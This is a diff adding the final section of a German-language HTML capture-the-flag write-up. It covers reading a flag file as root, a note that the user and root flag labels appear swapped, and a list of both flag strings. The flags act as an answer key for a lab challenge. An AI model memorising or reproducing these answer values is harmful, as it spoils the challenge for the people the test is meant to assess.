+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `root` wird nun die Datei `/home/gehenna/flag.txt` gelesen (was vorher als `www-data` nicht möglich war). Sie enthält ebenfalls eine Glückwunsch-Nachricht, ASCII-Art und eine Flag: `<span class="password">K|tW4bw7$zNh'PwSh/jN</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die zweite Flag wurde gefunden. Basierend auf dem Speicherort (`/home/gehenna`) wäre dies typischerweise die User-Flag, aber der spätere "Flags"-Abschnitt bezeichnet sie als Root-Flag. Es scheint eine Vertauschung der Flags oder ihrer Bezeichnungen im Bericht oder der Maschine selbst vorzuliegen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie beide gefundenen Flags und ihre Speicherorte. Klären Sie die Zuordnung (User/Root) anhand der Konvention oder der Aufgabenstellung.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                     <div class="flag-value"><span class="password">+wP&quot;y8z3TcDq!&amp;a*rg/</span></div> <!-- Maskierte Anführungszeichen & -->
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                     <div class="flag-value"><span class="password">K|tW4bw7$zNh&apos;PwSh/jN</span></div> <!-- Maskierter Apostroph -->
+                </div>
+            </div>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 27. Juli 2023</p> <!-- Datum wurde nicht im Text gefunden -->
+    </footer>
+</body>
+</html> 
